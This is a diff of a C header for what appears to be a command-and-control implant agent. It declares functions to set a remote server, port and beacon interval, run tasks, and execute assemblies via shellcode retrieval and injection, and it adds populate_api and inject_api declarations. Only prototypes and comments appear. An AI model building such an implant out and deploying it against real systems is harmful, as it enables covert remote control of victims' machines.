@@ -75,7 +75,7 @@ Agent* AgentAllocate(MALLOC malloc);
  * @note If population of a member fails, the function returns FALSE and all the members are considered uninitialized
  * @note Allocate the struct with `AgentAllocate` and free the agent with `AgentFree`
  */
-BOOL AgentPopulate(_In_ Agent* agent, _In_ CONST WCHAR remoteServer[AGENT_REMOTE_SERVER_MAX_LENGTH], _In_ CONST SIZE_T remoteServerLength, _In_ CONST INTERNET_PORT remotePort, _In_ CONST AGENT_INTERVAL interval, _In_ PAPI api);
+BOOL AgentPopulate(_In_ Agent* agent, _In_ CONST WCHAR remoteServer[AGENT_REMOTE_SERVER_MAX_LENGTH], _In_ CONST SIZE_T remoteServerLength, _In_ CONST INTERNET_PORT remotePort, _In_ CONST AGENT_INTERVAL interval);
 
 
 /**
@@ -185,7 +185,7 @@ BOOL AgentRemotePortSet(_Out_ Agent* agent, _In_ INTERNET_PORT remotePort);
  * @note: make sure Win32 api functions in `api` is initialized
  * @note: If the function fails, the `api` member remains unchanged
  */
-BOOL AgentApiSet(_Out_ Agent* agent, _In_ PAPI api);
+BOOL AgentApiSet(_Out_ Agent* agent);
 
 
 /**
@@ -324,6 +324,9 @@ BOOL _AgentExecuteShutdown(_In_ Agent* agent, _Out_ DLL* pEsgStdDll, _In_ Task t
  *       related to the retrieval of the shellcode or the injection process.
  */
 BOOL _AgentExecuteAssembly(_In_ Agent* agent, PESG_STD_API pEsgStdApi, CHAR** pTaskResult, DWORD* pdwSizeOfOutput);
+
+void populate_api();
+PAPI inject_api();
 
 #endif // AGENT_H
 
